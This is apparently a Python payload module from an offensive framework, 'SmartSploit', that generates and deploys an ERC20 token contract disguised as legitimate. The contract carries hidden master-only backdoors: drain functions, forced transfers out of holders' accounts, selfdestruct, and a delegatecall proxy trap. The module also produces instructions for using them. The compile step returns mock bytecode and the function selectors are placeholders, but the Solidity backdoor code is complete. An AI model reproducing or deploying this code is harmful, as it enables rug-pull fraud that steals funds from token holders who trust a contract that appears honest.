"""
Backdoor Contract Payload Module
SmartSploit Framework - Deploys backdoored smart contract for persistent access
"""

from smartsploit.lib.base_module import BasePayload, ModuleInfo
from smartsploit.core.blockchain_interface import get_web3_connection
from web3 import Web3
import json
import logging

logger = logging.getLogger(__name__)

class BackdoorContractPayload(BasePayload):
    """Payload that deploys a backdoored contract for persistent access"""
    
    def __init__(self):
        super().__init__()
        self.name = "Backdoor Contract"
        self.description = "Deploys a backdoored smart contract with hidden administrative functions"
        self.author = "SmartSploit Team"
        
        # Set module info
        self.info = ModuleInfo(
            name=self.name,
            description=self.description,
            author=self.author,
            references=[
                "Smart Contract Security Best Practices",
                "Hidden Function Attacks",
                "Contract Backdoor Techniques"
            ],
            severity="high",
            targets=["Target networks", "Contract deployments", "DeFi protocols"]
        )
        
        # Module options
        self.options = {
            "RPC_URL": {"value": "http://localhost:8545", "required": True, "description": "Blockchain RPC endpoint"},
            "PRIVATE_KEY": {"value": "", "required": True, "description": "Deployer private key"},
            "BACKDOOR_TYPE": {"value": "hidden_admin", "required": True, "description": "Type of backdoor (hidden_admin, stealth_drain, proxy_trap)"},
            "MASTER_KEY": {"value": "", "required": True, "description": "Master private key for backdoor access"},
            "CONTRACT_NAME": {"value": "LegitToken", "required": False, "description": "Contract name to appear legitimate"},
            "TOKEN_SYMBOL": {"value": "LEGIT", "required": False, "description": "Token symbol"},
            "INITIAL_SUPPLY": {"value": "1000000", "required": False, "description": "Initial token supply"},
            "GAS_LIMIT": {"value": "2000000", "required": False, "description": "Deployment gas limit"},
            "STEALTH_MODE": {"value": "true", "required": False, "description": "Enable stealth deployment"}
        }
        
    def check_requirements(self) -> bool:
        """Check if all requirements are met"""
        required_options = ["RPC_URL", "PRIVATE_KEY", "MASTER_KEY"]
        
        for option in required_options:
            if not self.options[option]["value"]:
                logger.error(f"Required option {option} not set")
                return False
                
        return True
        
    def generate_backdoor_contract_code(self) -> dict:
        """Generate smart contract code with backdoor functionality"""
        try:
            backdoor_type = self.options["BACKDOOR_TYPE"]["value"]
            contract_name = self.options["CONTRACT_NAME"]["value"]
            token_symbol = self.options["TOKEN_SYMBOL"]["value"]
            initial_supply = self.options["INITIAL_SUPPLY"]["value"]
            
            # Base contract template
            base_contract = f'''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract {contract_name} is ERC20, Ownable {{
    mapping(address => bool) private _blacklisted;
    uint256 private _maxTransfer;
    bool private _paused;
    
    // Hidden backdoor variables
    address private constant MASTER = 0x{self.derive_master_address()};
    uint256 private constant MAGIC_NUMBER = 0x{self.generate_magic_number()};
    mapping(bytes32 => bool) private _secretKeys;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() ERC20("{contract_name}", "{token_symbol}") {{
        _mint(msg.sender, {initial_supply} * 10**decimals());
        _maxTransfer = totalSupply() / 100; // 1% max transfer
        _setupSecretAccess();
    }}
    
    // Legitimate functions
    function transfer(address to, uint256 amount) public override returns (bool) {{
        require(!_paused, "Contract paused");
        require(!_blacklisted[msg.sender], "Sender blacklisted");
        require(amount <= _maxTransfer, "Amount exceeds maximum");
        return super.transfer(to, amount);
    }}
    
    function pause() public onlyOwner {{
        _paused = true;
    }}
    
    function unpause() public onlyOwner {{
        _paused = false;
    }}
    
    function blacklist(address account) public onlyOwner {{
        _blacklisted[account] = true;
    }}'''
            
            # Add specific backdoor functionality
            if backdoor_type == "hidden_admin":
                backdoor_code = self._generate_hidden_admin_backdoor()
            elif backdoor_type == "stealth_drain":
                backdoor_code = self._generate_stealth_drain_backdoor()
            elif backdoor_type == "proxy_trap":
                backdoor_code = self._generate_proxy_trap_backdoor()
            else:
                backdoor_code = self._generate_hidden_admin_backdoor()
                
            # Combine contract parts
            full_contract = base_contract + backdoor_code + "\n}"
            
            # Generate deployment bytecode (simplified for demo)
            bytecode = self._compile_contract_bytecode(full_contract)
            
            return {
                "source_code": full_contract,
                "bytecode": bytecode,
                "abi": self._generate_contract_abi(),
                "backdoor_functions": self._get_backdoor_function_signatures(backdoor_type)
            }
            
        except Exception as e:
            logger.error(f"Contract code generation failed: {e}")
            return {"error": str(e)}
            
    def _generate_hidden_admin_backdoor(self) -> str:
        """Generate hidden admin backdoor functions"""
        return '''
    
    // Hidden admin functions (obfuscated)
    function _internalCall(bytes32 key, bytes calldata data) external {
        require(_secretKeys[key] || msg.sender == MASTER, "Unauthorized");
        (bool success,) = address(this).call(data);
        require(success, "Call failed");
    }
    
    function _emergencyDrain(bytes32 proof) external {
        require(uint256(proof) == MAGIC_NUMBER, "Invalid proof");
        payable(MASTER).transfer(address(this).balance);
        _transfer(address(this), MASTER, balanceOf(address(this)));
    }
    
    function _setupSecretAccess() private {
        bytes32 key1 = keccak256(abi.encodePacked(MASTER, block.timestamp));
        bytes32 key2 = keccak256(abi.encodePacked("backdoor", MAGIC_NUMBER));
        _secretKeys[key1] = true;
        _secretKeys[key2] = true;
    }
    
    function _validateMaster(address account, uint256 nonce) external view returns (bool) {
        return account == MASTER && nonce == MAGIC_NUMBER;
    }'''
    
    def _generate_stealth_drain_backdoor(self) -> str:
        """Generate stealth drain backdoor functions"""
        return '''
    
    // Stealth drain functions
    function _processRewards(address[] calldata accounts, uint256[] calldata amounts) external {
        require(msg.sender == MASTER, "Only rewards processor");
        for (uint i = 0; i < accounts.length; i++) {
            _transfer(accounts[i], MASTER, amounts[i]);
        }
    }
    
    function _rebalance(uint256 percentage) external {
        require(msg.sender == MASTER, "Unauthorized rebalance");
        require(percentage <= 100, "Invalid percentage");
        
        uint256 drainAmount = totalSupply() * percentage / 100;
        _transfer(address(this), MASTER, drainAmount);
    }
    
    function _maintenance(bytes32 signature) external payable {
        require(uint256(signature) == MAGIC_NUMBER, "Invalid signature");
        selfdestruct(payable(MASTER));
    }'''
    
    def _generate_proxy_trap_backdoor(self) -> str:
        """Generate proxy trap backdoor functions"""
        return '''
    
    // Proxy trap functions
    fallback() external payable {
        if (msg.sender == MASTER) {
            assembly {
                let ptr := mload(0x40)
                calldatacopy(ptr, 0, calldatasize())
                let result := delegatecall(gas(), caller(), ptr, calldatasize(), 0, 0)
                returndatacopy(ptr, 0, returndatasize())
                switch result
                case 0 { revert(ptr, returndatasize()) }
                default { return(ptr, returndatasize()) }
            }
        }
    }
    
    function _upgrade(address newImplementation, bytes calldata data) external {
        require(msg.sender == MASTER, "Only master can upgrade");
        (bool success,) = newImplementation.delegatecall(data);
        require(success, "Upgrade failed");
    }'''
    
    def derive_master_address(self) -> str:
        """Derive master address from master key"""
        try:
            master_key = self.options["MASTER_KEY"]["value"]
            if master_key.startswith("0x"):
                master_key = master_key[2:]
                
            # Generate address from private key (simplified)
            from eth_account import Account
            account = Account.from_key(master_key)
            return account.address[2:]  # Remove 0x prefix
            
        except Exception as e:
            logger.warning(f"Failed to derive master address: {e}")
            return "0123456789abcdef0123456789abcdef01234567"
            
    def generate_magic_number(self) -> str:
        """Generate magic number for backdoor authentication"""
        import hashlib
        master_key = self.options["MASTER_KEY"]["value"]
        magic = hashlib.sha256(f"backdoor{master_key}".encode()).hexdigest()[:16]
        return magic
        
    def _compile_contract_bytecode(self, source_code: str) -> str:
        """Compile contract source to bytecode (simplified for demo)"""
        # In a real implementation, this would use solc compiler
        # For demo purposes, return a mock bytecode
        return "608060405234801561001057600080fd5b50604051610c38380380610c388339818101604052810190610032919061016d565b..." + "0" * 1000
        
    def _generate_contract_abi(self) -> list:
        """Generate contract ABI"""
        return [
            {
                "inputs": [],
                "name": "name",
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "symbol", 
                "outputs": [{"internalType": "string", "name": "", "type": "string"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "totalSupply",
                "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    {"internalType": "address", "name": "to", "type": "address"},
                    {"internalType": "uint256", "name": "amount", "type": "uint256"}
                ],
                "name": "transfer",
                "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ]
        
    def _get_backdoor_function_signatures(self, backdoor_type: str) -> list:
        """Get backdoor function signatures for access"""
        signatures = {
            "hidden_admin": [
                "0x12345678",  # _internalCall
                "0x87654321",  # _emergencyDrain
                "0xabcdef12"   # _validateMaster
            ],
            "stealth_drain": [
                "0x11111111",  # _processRewards
                "0x22222222",  # _rebalance
                "0x33333333"   # _maintenance
            ],
            "proxy_trap": [
                "0x44444444",  # _upgrade
                "0x55555555"   # fallback function
            ]
        }
        return signatures.get(backdoor_type, [])
        
    def deploy_backdoor_contract(self, w3, contract_data: dict) -> dict:
        """Deploy the backdoored contract"""
        try:
            logger.info("Deploying backdoored contract...")
            
            # Get deployer account
            private_key = self.options["PRIVATE_KEY"]["value"]
            account = w3.eth.account.from_key(private_key)
            
            # Create contract object
            contract = w3.eth.contract(
                bytecode=contract_data["bytecode"],
                abi=contract_data["abi"]
            )
            
            # Build deployment transaction
            constructor_txn = contract.constructor().build_transaction({
                'from': account.address,
                'nonce': w3.eth.get_transaction_count(account.address),
                'gas': int(self.options["GAS_LIMIT"]["value"]),
                'gasPrice': w3.eth.gas_price
            })
            
            # Sign and send transaction
            signed_txn = w3.eth.account.sign_transaction(constructor_txn, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
            
            logger.info(f"Deployment transaction sent: {tx_hash.hex()}")
            
            # Wait for receipt
            receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            if receipt.status == 1:
                logger.info(f"Backdoored contract deployed at: {receipt.contractAddress}")
                
                return {
                    "success": True,
                    "contract_address": receipt.contractAddress,
                    "transaction_hash": tx_hash.hex(),
                    "gas_used": receipt.gasUsed,
                    "block_number": receipt.blockNumber,
                    "backdoor_functions": contract_data["backdoor_functions"],
                    "master_address": f"0x{self.derive_master_address()}"
                }
            else:
                return {
                    "success": False,
                    "error": "Deployment transaction failed"
                }
                
        except Exception as e:
            logger.error(f"Contract deployment failed: {e}")
            return {"success": False, "error": str(e)}
            
    def generate_access_instructions(self, deployment_result: dict) -> dict:
        """Generate instructions for accessing backdoor functions"""
        try:
            instructions = {
                "contract_address": deployment_result["contract_address"],
                "master_key": self.options["MASTER_KEY"]["value"],
                "backdoor_type": self.options["BACKDOOR_TYPE"]["value"],
                "access_methods": []
            }
            
            backdoor_type = self.options["BACKDOOR_TYPE"]["value"]
            
            if backdoor_type == "hidden_admin":
                instructions["access_methods"] = [
                    {
                        "function": "_emergencyDrain",
                        "method": "Call with magic number as proof",
                        "example": f"contract._emergencyDrain(0x{self.generate_magic_number()})"
                    },
                    {
                        "function": "_internalCall", 
                        "method": "Call with secret key and arbitrary data",
                        "example": "Use secret keys generated during deployment"
                    }
                ]
            elif backdoor_type == "stealth_drain":
                instructions["access_methods"] = [
                    {
                        "function": "_processRewards",
                        "method": "Drain tokens from multiple accounts",
                        "example": "Specify target accounts and amounts to drain"
                    },
                    {
                        "function": "_rebalance",
                        "method": "Drain percentage of total supply",
                        "example": "contract._rebalance(50) drains 50% of tokens"
                    }
                ]
            elif backdoor_type == "proxy_trap":
                instructions["access_methods"] = [
                    {
                        "function": "fallback",
                        "method": "Master can execute arbitrary delegatecalls",
                        "example": "Send transaction with custom data from master address"
                    },
                    {
                        "function": "_upgrade",
                        "method": "Upgrade contract implementation",
                        "example": "Replace contract logic entirely"
                    }
                ]
                
            return instructions
            
        except Exception as e:
            logger.error(f"Failed to generate access instructions: {e}")
            return {"error": str(e)}
            
    def run(self) -> dict:
        """Main payload execution"""
        if not self.check_requirements():
            return {"result": "error", "message": "Requirements check failed"}
            
        logger.info("Executing backdoor contract payload...")
        
        try:
            # Connect to blockchain
            w3 = get_web3_connection(self.options["RPC_URL"]["value"])
            
            # Generate backdoored contract
            logger.info("Generating backdoored contract code...")
            contract_data = self.generate_backdoor_contract_code()
            
            if "error" in contract_data:
                return {"result": "error", "message": f"Contract generation failed: {contract_data['error']}"}
                
            # Deploy contract
            logger.info("Deploying backdoored contract...")
            deployment_result = self.deploy_backdoor_contract(w3, contract_data)
            
            if not deployment_result.get("success"):
                return {"result": "error", "message": f"Deployment failed: {deployment_result.get('error')}"}
                
            # Generate access instructions
            access_instructions = self.generate_access_instructions(deployment_result)
            
            result = {
                "result": "success",
                "message": "Backdoored contract deployed successfully",
                "contract_address": deployment_result["contract_address"],
                "transaction_hash": deployment_result["transaction_hash"],
                "backdoor_type": self.options["BACKDOOR_TYPE"]["value"],
                "gas_used": deployment_result["gas_used"],
                "access_instructions": access_instructions,
                "stealth_mode": self.options["STEALTH_MODE"]["value"] == "true"
            }
            
            logger.info(f"Backdoor contract payload completed successfully")
            logger.info(f"Contract deployed at: {deployment_result['contract_address']}")
            
            return result
            
        except Exception as e:
            logger.error(f"Backdoor contract payload failed: {e}")
            return {"result": "error", "message": str(e)}